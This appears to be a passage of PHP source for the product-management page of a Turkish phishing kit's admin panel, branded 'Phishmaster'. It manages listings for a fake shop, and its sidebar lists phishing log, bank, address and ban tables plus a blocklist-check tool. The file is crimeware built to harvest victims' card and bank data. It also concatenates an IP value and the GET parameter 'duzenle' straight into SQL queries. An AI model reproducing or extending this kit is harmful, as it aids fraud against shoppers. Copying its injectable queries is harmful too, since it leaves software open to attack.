<?php include_once(__DIR__ . "/../config.php"); include_once(__DIR__ . "/Data/Server/GrabIP.php"); include_once(__DIR__ . "/function/MainFunction.php"); include_once(__DIR__ . "/Data/Client/GetBank.php"); giris_dogrulama($pdo);
  
  $QueryServer = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);
  $QueryAdmin = $pdo->query("SELECT * FROM admin WHERE ip_adresi = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
  

  if($_GET['duzenle']) {

    $urunid = $_GET['duzenle'];
    $urunsorgukn = $pdo->query("SELECT * FROM urunler WHERE id = '{$urunid}'")->fetch(PDO::FETCH_ASSOC);

  }
  
  
  
  if($QueryServer["ip_filter"] == 1) {
    if(!in_array($ip, $ip_filter_config)) {
      die("IP Firewall - monke");
    }
  }
  

  if($_POST) {
    if($_POST['urun-adi']) {
      if(!empty($_POST['urun-adi']) and !empty($_POST['urun-fiyati']) and !empty($_POST['urun-resmi']) and !empty($_POST['urun-marka']) and !empty($_POST['fadsfdaads']) and !empty($_POST['urun-kategori']) and isset($_SESSION['giris_yapildi'])) {
        if(!is_numeric($_POST['urun-fiyati'])) {
          header('Location: urunler?msg=error&why=price');
          exit;
        } else if($_POST['urun-marka'] === "lütfen marka ekleyin") {
          header('Location: urunler?msg=error&why=markayokamk');
          exit;
        } else if($_POST['urun-kategori'] === "lütfen kategori ekleyin") {
          header('Location: urunler?msg=error&why=kategoriyokamk');
          exit;
        } else {
          $stmt1 = $pdo->prepare('INSERT INTO urunler SET urun_adi = ?, urun_fiyati = ?, urun_resmi = ?, urun_aciklamasi=?, urun_kategorisi = ?, urun_markasi = ?');
          $stmt1->execute([ $_POST['urun-adi'], $_POST['urun-fiyati'].' TL', $_POST['urun-resmi'],  $_POST['fadsfdaads'], $_POST['urun-kategori'], $_POST['urun-marka'] ]);
          header('Location: urunler?msg=success&why=uruneklendi');
          exit;
        }
      }

      
    } else if($_POST['isimguncelleme']) {
      if(!empty($_POST['isimguncelleme']) and isset($_SESSION['giris_yapildi'])) {
        $guncellenenAlanlar = [];
        $degerler = [];
        
        if (!empty($_POST['isimguncelleme'])) {
            $guncellenenAlanlar[] = "urun_adi=?";
            $degerler[] = htmlspecialchars($_POST['isimguncelleme']);
        }
        
        if (!empty($_POST['fiyatguncelleme'])) {
            $guncellenenAlanlar[] = "urun_fiyati=?";
            $degerler[] = htmlspecialchars($_POST['fiyatguncelleme']) . " TL";
        }
        
        if (!empty($_POST['resimguncelleme'])) {
            $guncellenenAlanlar[] = "urun_resmi=?";
            $degerler[] = htmlspecialchars($_POST['resimguncelleme']);
        }
        
        if (!empty($_POST['markaguncelleme'])) {
            $guncellenenAlanlar[] = "urun_markasi=?";
            $degerler[] = htmlspecialchars($_POST['markaguncelleme']);
        }
        
        if (!empty($_POST['kategoriguncelleme'])) {
            $guncellenenAlanlar[] = "urun_kategorisi=?";
            $degerler[] = htmlspecialchars($_POST['kategoriguncelleme']);
        }
        
        if (!empty($_POST['aciklamaguncelleme'])) {
            $guncellenenAlanlar[] = "urun_aciklamasi=?";
            $degerler[] = $_POST['aciklamaguncelleme'];
        }
        
        if (!empty($guncellenenAlanlar)) {
            $guncellemeSorgusu = "UPDATE urunler SET " . implode(", ", $guncellenenAlanlar) . " WHERE id = ?";
            $degerler[] = $urunid;
            $sorgu = $pdo->prepare($guncellemeSorgusu);
            $sorgu->execute($degerler);
            header('Location: urunler?msg=success&why=urunguncellendi');
            exit;
        }
      }
      
    } else if($_POST['urun-id']) {
      if(!empty($_POST['urun-id']) and isset($_SESSION['giris_yapildi'])) {
        $stmt_check = $pdo->prepare("SELECT COUNT(*) FROM urunler WHERE id = ?");
        $stmt_check->execute([$_POST['urun-id']]);
        $existing_count = $stmt_check->fetchColumn();
        
        if(!is_numeric($_POST['urun-id'])) {
          header('Location: urunler?msg=error&why=id');
          exit;
        } else if($existing_count === 0) {
          header('Location: urunler?msg=error&why=idempty');
          exit;
        } else {
          $stmt = $pdo->prepare('DELETE FROM urunler WHERE id = ?');
          $stmt->execute([ $_POST['urun-id']]);
          header('Location: urunler?msg=success&why=urunsilindi');
          exit;
        }
      }
    } else if($_POST['kategori-adi']) {
      if(!empty($_POST['kategori-adi']) and isset($_SESSION['giris_yapildi'])) {
          $stmt1 = $pdo->prepare('INSERT INTO kategoriler SET kategori_adi = ?');
          $stmt1->execute([ $_POST['kategori-adi'] ]);
          header('Location: urunler?msg=success&why=kategorieklendi');
          exit;
      }
    } else if($_POST['kategori-id']) {
      if(!empty($_POST['kategori-id']) and isset($_SESSION['giris_yapildi'])) {
        $stmt_check = $pdo->prepare("SELECT COUNT(*) FROM kategoriler WHERE id = ?");
        $stmt_check->execute([$_POST['kategori-id']]);
        $existing_count = $stmt_check->fetchColumn();
        
        if(!is_numeric($_POST['kategori-id'])) {
          header('Location: urunler?msg=error&why=id');
          exit;
        } else if($existing_count === 0) {
          header('Location: urunler?msg=error&why=idempty');
          exit;
        } else {
          $stmt = $pdo->prepare('DELETE FROM kategoriler WHERE id = ?');
          $stmt->execute([ $_POST['kategori-id']]);
          header('Location: urunler?msg=success&why=kategorisilindi');
          exit;
        }
      }
    } else if($_POST['marka-adi']) {
      if(!empty($_POST['marka-adi']) and isset($_SESSION['giris_yapildi'])) {
          $stmt1 = $pdo->prepare('INSERT INTO markalar SET marka_adi = ?');
          $stmt1->execute([ $_POST['marka-adi'] ]);
          header('Location: urunler?msg=success&why=markaeklendi');
          exit;
      }
    } else if($_POST['marka-id']) {
      if(!empty($_POST['marka-id']) and isset($_SESSION['giris_yapildi'])) {
        $stmt_check = $pdo->prepare("SELECT COUNT(*) FROM markalar WHERE id = ?");
        $stmt_check->execute([$_POST['marka-id']]);
        $existing_count = $stmt_check->fetchColumn();
        
        if(!is_numeric($_POST['marka-id'])) {
          header('Location: urunler?msg=error&why=id');
          exit;
        } else if($existing_count === 0) {
          header('Location: urunler?msg=error&why=idempty');
          exit;
        } else {
          $stmt = $pdo->prepare('DELETE FROM markalar WHERE id = ?');
          $stmt->execute([ $_POST['marka-id']]);
          header('Location: urunler?msg=success&why=markasilindi');
          exit;
        }
      }
    }
  }

  $sg = $pdo->prepare("SELECT id, kategori_adi FROM kategoriler");
  $sg->execute();
  $kategoriler = $sg->fetchAll(PDO::FETCH_ASSOC);

  $cqceweqwc = $pdo->prepare("SELECT id, marka_adi FROM markalar");
  $cqceweqwc->execute();
  $markalar = $cqceweqwc->fetchAll(PDO::FETCH_ASSOC);

?>
<!doctype html>
<html lang="tr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>monke - Ürün Tablosu</title>
    <meta name="description" content="monke Panel">
    <meta name="author" content="monke">
    <meta name="robots" content="noindex, nofollow">
    
    <meta property="og:title" content="monke Panel">
    <meta property="og:site_name" content="Developed monke">
    <meta property="og:description" content="monke Panel">
    <meta property="og:type" content="website">

    <link rel="shortcut icon" href="assets/media/favicons/favicon.png">
    <link rel="icon" type="image/png" sizes="192x192" href="assets/media/favicons/favicon-192x192.png">
    <link rel="apple-touch-icon" sizes="180x180" href="assets/media/favicons/apple-touch-icon-180x180.png">
    <link rel="stylesheet" id="css-main" href="assets/css/oneui.min.css">
    <link rel="stylesheet" href="assets/js/plugins/datatables-bs5/css/dataTables.bootstrap5.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link href="//cdn.quilljs.com/1.3.6/quill.snow.css" rel="stylesheet">
<link href="//cdn.quilljs.com/1.3.6/quill.bubble.css" rel="stylesheet">
    <script>
      $(document).ready(function() {
        setInterval(function() {
          $("#tablo").load(window.location.href + " #tablo");
        }, 3000);
      });
    </script>
  </head>
  <body>
    <div id="page-container" class="sidebar-o sidebar-light enable-page-overlay side-scroll page-header-fixed remember-theme">
      <nav id="sidebar" aria-label="Main Navigation">
        <div class="content-header">
          <a class="fw-semibold text-dual" href="main">
            <span class="smini-visible">
              <i class="fa-solid fa-crosshairs text-primary"></i>
            </span>
            <span class="smini-hide fs-5 tracking-wider">Phish<span class="fw-normal">master</span></span>
          </a>
          <div>
            <button type="button" class="btn btn-sm btn-alt-secondary" data-toggle="layout" data-action="dark_mode_toggle">
              <i class="fa fa-moon"></i>
            </button>
            <div class="dropdown d-inline-block ms-1">
              <button type="button" class="btn btn-sm btn-alt-secondary" id="sidebar-themes-dropdown" data-bs-toggle="dropdown" data-bs-auto-close="outside" aria-haspopup="true" aria-expanded="false">
                <i class="fa fa-brush"></i>
              </button>
              <div class="dropdown-menu dropdown-menu-end fs-sm smini-hide border-0" aria-labelledby="sidebar-themes-dropdown">
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="default">
                  <span>Varsayılan</span>
                  <i class="fa fa-circle text-default"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/amethyst.min.css">
                  <span>Stil 1</span>
                  <i class="fa fa-circle text-amethyst"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/city.min.css">
                  <span>Stil 2</span>
                  <i class="fa fa-circle text-city"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/flat.min.css">
                  <span>Stil 3</span>
                  <i class="fa fa-circle text-flat"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/modern.min.css">
                  <span>Stil 4</span>
                  <i class="fa fa-circle text-modern"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/smooth.min.css">
                  <span>Stil 5</span>
                  <i class="fa fa-circle text-smooth"></i>
                </button>
              </div>
            </div>
            <a class="d-lg-none btn btn-sm btn-alt-secondary ms-1" data-toggle="layout" data-action="sidebar_close" href="javascript:void(0)">
              <i class="fa fa-fw fa-times"></i>
            </a>
          </div>
        </div>
        <div class="js-sidebar-scroll">
          <div class="content-side">
            <ul class="nav-main">
              <li class="nav-main-item">
                <a class="nav-main-link" href="main">
                  <i class="nav-main-link-icon si si-speedometer"></i>
                  <span class="nav-main-link-name">Anasayfa</span>
                </a>
              </li>
              <li class="nav-main-heading">PHISHING</li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="logs">
                  <i class="nav-main-link-icon si si-credit-card"></i>
                  <span class="nav-main-link-name">Log Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="bans">
                  <i class="nav-main-link-icon si si-ban"></i>
                  <span class="nav-main-link-name">Ban Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="banks">
                  <i class="nav-main-link-icon fa fa-bank"></i>
                  <span class="nav-main-link-name">Banka Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link active" href="urunler">
                  <i class="nav-main-link-icon fa fa-cart-shopping"></i>
                  <span class="nav-main-link-name">Ürün Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="address">
                  <i class="nav-main-link-icon fa fa-map"></i>
                  <span class="nav-main-link-name">Adres Tablosu</span>
                </a>
              </li>
              <li class="nav-main-heading">ARACLAR</li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="javascript:void(0);" id="check_usom">
                  <i class="nav-main-link-icon fa fa-check-double"></i>
                  <span class="nav-main-link-name">USOM Kontrolü</span>
                </a>
              </li>
              <?php if($QueryAdmin['yetki'] == "Superadmin"): ?>
              <li class="nav-main-heading">YONETIM</li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="user">
                  <i class="nav-main-link-icon si si-people"></i>
                  <span class="nav-main-link-name">Kullanıcı Yönetimi</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="action_history">
                  <i class="nav-main-link-icon si si-list"></i>
                  <span class="nav-main-link-name">İşlem Geçmişi</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="javascript:void(0);" id="factory_reset">
                  <i class="nav-main-link-icon fa-solid fa-wrench"></i>
                  <span class="nav-main-link-name">Fabrika Ayarları</span>
                </a>
              </li>
              <?php endif; ?>
            </ul>
          </div>
        </div>
      </nav>
      <header id="page-header">
        <div class="content-header">
          <div class="d-flex align-items-center">
            <button type="button" class="btn btn-sm btn-alt-secondary me-2 d-lg-none" data-toggle="layout" data-action="sidebar_toggle">
              <i class="fa fa-fw fa-bars"></i>
            </button>
            <button type="button" class="btn btn-sm btn-alt-secondary me-2 d-none d-lg-inline-block" data-toggle="layout" data-action="sidebar_mini_toggle">
              <i class="fa fa-fw fa-ellipsis-v"></i>
            </button>
          </div>
          <div class="d-flex align-items-center">
            <div class="dropdown d-inline-block ms-2">
              <button type="button" class="btn btn-sm btn-alt-secondary d-flex align-items-center" id="page-header-user-dropdown" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <img class="rounded-circle" src="assets/media/avatars/avatar0.jpg" style="width: 21px;">
                <span class="d-none d-sm-inline-block ms-2"><?php echo $QueryAdmin['kullanici_adi']; ?></span>
                <i class="fa fa-fw fa-angle-down d-none d-sm-inline-block opacity-50 ms-1 mt-1"></i>
              </button>
              <div class="dropdown-menu dropdown-menu-md dropdown-menu-end p-0 border-0" aria-labelledby="page-header-user-dropdown">
                <div class="p-3 text-center bg-body-light border-bottom rounded-top">
                  <p class="mt-2 mb-0 fw-medium"><?php echo $QueryAdmin['kullanici_adi']; ?></p>
                  <p class="mb-0 text-muted fs-sm fw-medium"><?php echo $QueryAdmin['yetki']; ?></p>
                </div>
                <div class="p-2">
                  <a class="dropdown-item d-flex align-items-center justify-content-between" href="settings">
                    <span class="fs-sm fw-medium">Ayarlar</span>
                  </a>
                  <a class="dropdown-item d-flex align-items-center justify-content-between" href="quit">
                    <span class="fs-sm fw-medium">Çıkış Yap</span>
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </header>
      <main id="main-container">
        <div class="bg-body-light">
          <div class="content content-full">
            <div class="d-flex flex-column flex-sm-row justify-content-sm-between align-items-sm-center py-2">
              <div class="flex-grow-1">
                <h1 class="h3 fw-bold mb-2"> Ürün Tablosu </h1>
                <h2 class="fs-base lh-base fw-medium text-muted mb-0">
                    <?php echo $mesaj; ?> <a class="link-fx" href="javascript:void(0)"><?php echo $QueryAdmin['kullanici_adi']; ?></a>, bu sayfa sayesinde phishingteki ürünleri kontrol edebilirsin.
                </h2>
              </div>
              <nav class="flex-shrink-0 mt-3 mt-sm-0 ms-sm-3" aria-label="breadcrumb">
                <ol class="breadcrumb breadcrumb-alt">
                  <li class="breadcrumb-item">
                    <a class="link-fx" href="javascript:void(0)">Phishing</a>
                  </li>
                  <li class="breadcrumb-item" aria-current="page"> Ürün Tablosu </li>
                </ol>
              </nav>
            </div>
          </div>
        </div>
        <div class="content">
          <?php if($_GET['duzenle']): ?>
            <span>ürününüzde fotoğraf, kategori yoksa buradan düzenleyin</span>
            <br>
            <span style="color: red;">kutularda boşluk bırakmayın!</span>
            <br><br>

            <form method="POST">
                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="isimguncelleme">Ürün Adı</label>
                      <input type="text" class="form-control" id="isimguncelleme" name="isimguncelleme" value="<?= $urunsorgukn["urun_adi"]; ?>" placeholder="Ürün Adı">
                    </div>

                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="fiyatguncelleme">Ürün Fiyatı</label>
                      <input type="text" class="form-control" id="fiyatguncelleme" name="fiyatguncelleme" value="<?=str_replace('TL', '', $urunsorgukn["urun_fiyati"]); ?>" placeholder="Ürün Fiyatı">
                    </div>

                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="resimguncelleme">Ürün Resmi</label>
                      <input type="text" class="form-control" id="resimguncelleme" name="resimguncelleme" value="<?= $urunsorgukn["urun_resmi"]; ?>" placeholder="Ürün Resmi">
                    </div>

                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="markaguncelleme">Ürün Markası (Yeni Ekledikleriniz Gelmediyse F5 Atın)</label>
                      <select class="form-select" id="markaguncelleme" name="markaguncelleme">
                        <?php if (empty($markalar)) : ?>
                            <option selected>lütfen marka ekleyin</option>
                        <?php else : ?>
                            <option selected disabled>seçiniz...</option>
                            <?php foreach ($markalar as $marka) : ?>
                                <option value="<?php echo $marka['marka_adi']; ?>"><?php echo $marka['marka_adi']; ?></option>
                            <?php endforeach; ?>
                        <?php endif; ?>
                      </select>
                    </div>

                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="kategoriguncelleme">Ürün Kategorisi (Yeni Ekledikleriniz Gelmediyse F5 Atın)</label>
                      <select class="form-select" id="kategoriguncelleme" name="kategoriguncelleme">
                        <?php if (empty($kategoriler)) : ?>
                            <option selected>lütfen kategori ekleyin</option>
                        <?php else : ?>
                            <option selected disabled>seçiniz...</option>
                            <?php foreach ($kategoriler as $kategori) : ?>
                                <option value="<?php echo $kategori['id']; ?>"><?php echo $kategori['kategori_adi']; ?></option>
                            <?php endforeach; ?>
                        <?php endif; ?>
                      </select>
                    </div>

                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="aciklamaguncelleme">Ürün Açıklaması (HTML kodu ile yazarsanız daha güzel olur)</label>
                      <textarea id="aciklamaguncelleme" class="form-control" value="<?= $urunsorgukn["urun_aciklamasi"]; ?>" name="aciklamaguncelleme" rows="4" cols="50"></textarea>
                    </div>

                    
                    <div class="mb-3">

                      <button type="submit" class="btn btn-sm btn-success">
                        <i class="fa fa-fw fa-plus me-1"></i> Ürün Güncelle
                      </button>
                    </div>
                  </form>
          <?php else: ?>

          <div class="col-12">
            <div class="block block-rounded row g-0">
              <ul class="nav nav-tabs nav-tabs-block flex-md-column col-md-4 col-xxl-2" role="tablist">
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start active" id="banka-ban-kaldir-buton" data-bs-toggle="tab" data-bs-target="#banka-ban-kaldir" role="tab" aria-controls="banka-ban-kaldir" aria-selected="true">
                    <i class="fa-regular fa-gem"></i>
                    <span>Ürün Ekle</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                     Panele yeni bir ürün ekleyebilirsin.
                    </span>
                  </button>
                </li>
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start" id="banka-banla-buton" data-bs-toggle="tab" data-bs-target="#banka-banla" role="tab" aria-controls="banka-banla" aria-selected="false">
                    <i class="fa-regular fa-gem"></i>
                    <span>Ürün Sil</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Panelde mevcut olan ürünü silebilirsin.
                    </span>
                  </button>
                </li>
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start" id="banka-tablosu-buton" data-bs-toggle="tab" data-bs-target="#banka-tablosu" role="tab" aria-controls="banka-tablosu" aria-selected="false">
                  <i class="fa-regular fa-gem"></i>
                    <span>Ürün Tablosu</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Panelde mevcut olan ürünleri listeleyebilirsin.
                    </span>
                  </button>
                </li>
                <hr>
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start" id="kategori-tablosu-buton" data-bs-toggle="tab" data-bs-target="#kategori-tablosu" role="tab" aria-controls="kategori-tablosu" aria-selected="false">
                    <i class="fa-regular fa-gem"></i>
                    <span>Kategori Tablosu</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Kategoriler sabittir değiştirmeyin.
                    </span>
                  </button>
                </li>
                

                <hr>
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start" id="marka-ekle-buton" data-bs-toggle="tab" data-bs-target="#marka-ekle" role="tab" aria-controls="marka-ekle" aria-selected="false">
                    <i class="fa-regular fa-gem"></i>
                    <span>Marka Ekle</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                     Panele yeni bir marka ekleyebilirsin.
                    </span>
                  </button>
                </li>
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start" id="marka-sil-buton" data-bs-toggle="tab" data-bs-target="#marka-sil" role="tab" aria-controls="marka-sil" aria-selected="false">
                    <i class="fa-regular fa-gem"></i>
                    <span>Marka Sil</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Panelde mevcut olan markayı silebilirsin.
                    </span>
                  </button>
                </li>
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start" id="marka-tablosu-buton" data-bs-toggle="tab" data-bs-target="#marka-tablosu" role="tab" aria-controls="marka-tablosu" aria-selected="false">
                    <i class="fa-regular fa-gem"></i>
                    <span>Marka Tablosu</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Panelde mevcut olan markaları görebilirsin.
                    </span>
                  </button>
                </li>



              </ul>
              <div class="tab-content col-md-8 col-xxl-10">
                <div class="block-content tab-pane active" id="banka-ban-kaldir" role="tabpanel" aria-labelledby="banka-ban-kaldir-buton" tabindex="0">
                  <h4 class="fw-semibold">Ürün Ekle</h4>
                  <button type="button" id="otourunekle" onclick="uruneklemethod('oto')" disabled class="btn btn-primary btn-sm"><i class="fa-solid fa-plus"></i> Oto Ürün Ekle</button>
                  <button type="button" id="manuelurunekle" onclick="uruneklemethod('manuel')" class="btn btn-primary btn-sm"><i class="fa-solid fa-plus"></i> Manuel Ürün Ekle</button>
                  <br>
                  <br>
                  <div id="manuelurun" style="display: none">
                  <form method="POST">
                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="urun-adi">Ürün Adı</label>
                      <input type="text" class="form-control" id="urun-adi" name="urun-adi" placeholder="Ürün Adı">
                    </div>

                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="urun-fiyati">Ürün Fiyatı</label>
                      <input type="text" class="form-control" id="urun-fiyati" name="urun-fiyati" placeholder="Ürün Fiyatı">
                    </div>

                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="urun-resmi">Ürün Resmi</label>
                      <input type="text" class="form-control" id="urun-resmi" name="urun-resmi" placeholder="Ürün Resmi">
                    </div>

                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="urun-marka">Ürün Markası (Yeni Ekledikleriniz Gelmediyse F5 Atın)</label>
                      <select class="form-select" id="urun-marka" name="urun-marka">
                        <?php if (empty($markalar)) : ?>
                            <option selected>lütfen marka ekleyin</option>
                        <?php else : ?>
                            <option selected disabled>seçiniz...</option>
                            <?php foreach ($markalar as $marka) : ?>
                                <option value="<?php echo $marka['marka_adi']; ?>"><?php echo $marka['marka_adi']; ?></option>
                            <?php endforeach; ?>
                        <?php endif; ?>
                      </select>
                    </div>

                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="urun-kategori">Ürün Kategorisi (Yeni Ekledikleriniz Gelmediyse F5 Atın)</label>
                      <select class="form-select" id="urun-kategori" name="urun-kategori">
                        <?php if (empty($kategoriler)) : ?>
                            <option selected>lütfen kategori ekleyin</option>
                        <?php else : ?>
                            <option selected disabled>seçiniz...</option>
                            <?php foreach ($kategoriler as $kategori) : ?>
                                <option value="<?php echo $kategori['id']; ?>"><?php echo $kategori['kategori_adi']; ?></option>
                            <?php endforeach; ?>
                        <?php endif; ?>
                      </select>
                    </div>

                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="urun-aciklama">Ürün Açıklaması</label>
                      <textarea id="fadsfdaads" class="form-control" name="fadsfdaads" rows="4" cols="50"></textarea>
                    </div>

                    
                    <div class="mb-3">

                      <button type="submit" id="eklebuton" class="btn btn-sm btn-success">
                        <i class="fa fa-fw fa-plus me-1"></i> Ürün Ekle
                      </button>
                    </div>
                  </form>
                  </div>
                  <div id="otourun">


                  <div class="mb-4 col-md-4">
                      <label class="form-label" for="otourunlinki">Ürün Linki (Sadece Trendyol Linkleri)</label>
                      <input type="text" class="form-control" id="otourunlinki" name="otourunlinki" placeholder="Ürün Linki">
                    </div>

                  <div class="mb-3">

                          <button type="button" id="otoeklebuton" class="btn btn-sm btn-success">
                            <i class="fa fa-fw fa-plus me-1"></i> Ürün Ekle
                          </button>
                          </div>
                                            </div>
                  


                  <script>
                    function uruneklemethod(type) {
                      if(type == "oto") {
                        document.getElementById('manuelurun').style.display = "none"
                        document.getElementById('otourun').style.display = "block"
                        document.getElementById('otourunekle').disabled = true
                        document.getElementById('manuelurunekle').disabled = false
                      } else if(type == "manuel") {
                        document.getElementById('otourun').style.display = "none"
                        document.getElementById('manuelurun').style.display = "block"
                        document.getElementById('manuelurunekle').disabled = true
                        document.getElementById('otourunekle').disabled = false
                      }
                    }

                  </script>
   
                </div>
                <div class="block-content tab-pane" id="banka-banla" role="tabpanel" aria-labelledby="banka-banla-buton" tabindex="0">
                  <h4 class="fw-semibold">Ürün Sil</h4>
                  <form method="POST" >
                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="urun-id">Ürün ID</label>
                      <input type="text" class="form-control" id="urun-id" name="urun-id" placeholder="Ürün ID">
                    </div>
                    <div class="mb-3">
                      <button type="submit" class="btn btn-sm btn-danger">
                        <i class="fa fa-fw fa-times me-1"></i> Ürün Sil
                      </button>
                    </div>
                  </form>
                </div>
                <div class="block-content tab-pane" id="banka-tablosu" role="tabpanel" aria-labelledby="banka-tablosu-buton" tabindex="0">
                  <h4 class="fw-semibold">Ürün Tablosu</h4>
                    <div class="block-content block-content-full">
                     <table class="table table-bordered table-striped table-vcenter js-dataTable-responsive">
                        <thead>
                           <tr>
                              <th class="text-center fw-light fs-sm" style="width: 300px;"> ürün id</th>
                              <th class="text-center fw-light fs-sm" style="width: 300px;"> ürün resmi</th>
                              <th class="text-center fw-light fs-sm" style="width: 300px;"> ürün adı</th>
                              <th class="text-center fw-light fs-sm" style="width: 300px;"> ürün fiyatı</th>
                              <th class="text-center fw-light fs-sm" style="width: 300px;"> ürün kategorisi</th>
                              <th class="text-center fw-light fs-sm" style="width: 300px;"> ürün markası</th>
                           </tr>
                        </thead>
                        <tbody>
                        <?php foreach($pdo->query('SELECT * FROM urunler ORDER BY id DESC') as $urun){ ?>
                          <tr>
                            <td class="text-center fw-normal fs-sm"><a href="javascript:void(0)" class="Kopyala" data-clipboard-text="<?php echo htmlspecialchars($urun['id']); ?>"><?php echo htmlspecialchars($urun['id']); ?></a></td>  
                            <td class="text-center fw-normal fs-sm"><img src="<?php echo htmlspecialchars($urun['urun_resmi']); ?>" width="150px" height="150px"></td>  
                            <td class="text-center fw-normal fs-sm"><a href="?duzenle=<?php echo htmlspecialchars($urun['id']); ?>"><?php echo htmlspecialchars($urun['urun_adi']); ?></a></td>  
                            <td class="text-center fw-normal fs-sm"><a href="javascript:void(0)" class="Kopyala" data-clipboard-text="<?php echo htmlspecialchars($urun['urun_fiyati']); ?>"><?php echo htmlspecialchars($urun['urun_fiyati']); ?></a></td>  
                            <td class="text-center fw-normal fs-sm"><a href="javascript:void(0)" class="Kopyala" data-clipboard-text="<?php echo htmlspecialchars($urun['urun_kategorisi']); ?>"><?php echo htmlspecialchars($urun['urun_kategorisi']); ?></a></td>  
                            <td class="text-center fw-normal fs-sm"><a href="javascript:void(0)" class="Kopyala" data-clipboard-text="<?php echo htmlspecialchars($urun['urun_markasi']); ?>"><?php echo htmlspecialchars($urun['urun_markasi']); ?></a></td>  
                          </tr>
                        <?php } ?>
                        </tbody>
                     </table>
                  </div>
                </div>

                <div class="block-content tab-pane" id="kategori-tablosu" role="tabpanel" aria-labelledby="kategori-tablosu-buton" tabindex="0">
                  <h4 class="fw-semibold">Kategori Tablosu</h4>
                    <div class="block-content block-content-full">
                     <table class="table table-bordered table-striped table-vcenter js-dataTable-responsive">
                        <thead>
                           <tr>
                              <th class="text-center fw-light fs-sm" style="width: 300px;"> kategori id</th>
                              <th class="text-center fw-light fs-sm" style="width: 300px;"> kategori adı</th>
                           </tr>
                        </thead>
                        <tbody>
                        <?php foreach($pdo->query('SELECT * FROM kategoriler ORDER BY id DESC') as $urun){ ?>
                          <tr>
                            <td class="text-center fw-normal fs-sm"><a href="javascript:void(0)" class="Kopyala" data-clipboard-text="<?php echo htmlspecialchars($urun['id']); ?>"><?php echo htmlspecialchars($urun['id']); ?></a></td>  
                            <td class="text-center fw-normal fs-sm"><a href="javascript:void(0)" class="Kopyala" data-clipboard-text="<?php echo htmlspecialchars($urun['kategori_adi']); ?>"><?php echo htmlspecialchars($urun['kategori_adi']); ?></a></td>  
                          </tr>
                        <?php } ?>
                        </tbody>
                     </table>
                  </div>
                </div>


                



                <div class="block-content tab-pane" id="marka-ekle" role="tabpanel" aria-labelledby="marka-ekle-buton" tabindex="0">
                  <h4 class="fw-semibold">Marka Ekle</h4>
                  <form method="POST">
                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="marka-adi">Marka Adı</label>
                      <input type="text" class="form-control" id="marka-adi" name="marka-adi" placeholder="Marka Adı">
                    </div>
                    
                    <div class="mb-3">
                      <button type="submit" class="btn btn-sm btn-success">
                        <i class="fa fa-fw fa-plus me-1"></i> Marka Ekle
                      </button>
                    </div>
                  </form>
                </div>
                <div class="block-content tab-pane" id="marka-sil" role="tabpanel" aria-labelledby="marka-sil-buton" tabindex="0">
                  <h4 class="fw-semibold">Marka Sil</h4>
                  <form method="POST">
